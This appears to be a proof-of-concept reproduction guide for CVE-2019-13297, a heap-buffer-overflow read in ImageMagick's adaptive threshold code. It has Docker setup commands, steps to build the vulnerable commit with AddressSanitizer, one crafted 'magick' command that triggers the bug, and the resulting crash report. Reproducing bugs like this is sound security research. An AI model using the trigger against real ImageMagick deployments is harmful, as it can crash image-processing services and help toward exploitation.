### CVE-2019-13297

### PoC Links
[Github.com](https://github.com/ImageMagick/ImageMagick/issues/1609)

### Docker Container Run Command
```shell
docker build -t cve-2019-13297-poc .
docker run --privileged --cap-add sys_ptrace  --security-opt seccomp=unconfined -itd --name CVE-2019-13297-POC cve-2019-13297-poc
docker exec -it CVE-2019-13297-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:ImageMagick/ImageMagick.git

# Rollback to the vulnerable version.
cd ImageMagick/
git reset --hard a7759f410b773a1dd57b0e1fb28112e1cd8b97bc

# Install the compilation and installation dependencies.
apt install gcc gdb make pkg-config libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
CFLAGS="-O0 -g -fsanitize=address" ./configure --disable-openmp
make -j$(nproc)
make install
ldconfig

# exec the poc
magick -seed 0 -dispose Background "(" magick:netscape -lat 514x0-41  ")" "(" magick:granite -charcoal 3 -level 0%,125,0.328  ")" -combine -print ""   tmp

```

### Description
Observed that:
```shell
=================================================================
==28491==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffff9b804090 at pc 0xffffa4b82614 bp 0xffffd8990630 sp 0xffffd8990640
READ of size 4 at 0xffff9b804090 thread T0
#0 0xffffa4b82610 in AdaptiveThresholdImage MagickCore/threshold.c:330
#1 0xffffa460ec30 in CLISimpleOperatorImage MagickWand/operation.c:2571
#2 0xffffa46186e0 in CLISimpleOperatorImages MagickWand/operation.c:3685
#3 0xffffa4621f64 in CLIOption MagickWand/operation.c:5273
#4 0xffffa44cb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#5 0xffffa44ccf64 in MagickImageCommand MagickWand/magick-cli.c:796
#6 0xffffa450a49c in MagickCommandGenesis MagickWand/mogrify.c:185
#7 0xaaaae89e724c in MagickMain utilities/magick.c:149
#8 0xaaaae89e74d8 in main utilities/magick.c:180
#9 0xffffa3ea73f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#10 0xffffa3ea74c8 in __libc_start_main_impl ../csu/libc-start.c:392
#11 0xaaaae89e6c2c in _start (/usr/local/bin/magick+0x1c2c)

0xffff9b804090 is located 656 bytes to the right of 3456-byte region [0xffff9b803080,0xffff9b803e00)
allocated by thread T0 here:
#0 0xffffa517af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffa4a43778 in AcquireAlignedMemory MagickCore/memory.c:265
#2 0xffffa48b56cc in AcquireCacheNexusPixels MagickCore/cache.c:4968
#3 0xffffa48b612c in SetPixelCacheNexusPixels MagickCore/cache.c:5070
#4 0xffffa48aaf60 in GetVirtualPixelCacheNexus MagickCore/cache.c:2751
#5 0xffffa48bc41c in GetCacheViewVirtualPixels MagickCore/cache-view.c:664
#6 0xffffa4b81da8 in AdaptiveThresholdImage MagickCore/threshold.c:259
#7 0xffffa460ec30 in CLISimpleOperatorImage MagickWand/operation.c:2571
#8 0xffffa46186e0 in CLISimpleOperatorImages MagickWand/operation.c:3685
#9 0xffffa4621f64 in CLIOption MagickWand/operation.c:5273
#10 0xffffa44cb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffa44ccf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffa450a49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaae89e724c in MagickMain utilities/magick.c:149
#14 0xaaaae89e74d8 in main utilities/magick.c:180
#15 0xffffa3ea73f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffa3ea74c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaae89e6c2c in _start (/usr/local/bin/magick+0x1c2c)

SUMMARY: AddressSanitizer: heap-buffer-overflow MagickCore/threshold.c:330 in AdaptiveThresholdImage
Shadow bytes around the buggy address:
0x200ff37007c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff37007d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff37007e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff37007f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3700800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x200ff3700810: fa fa[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3700820: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3700830: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3700840: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3700850: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3700860: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==28491==ABORTING
```



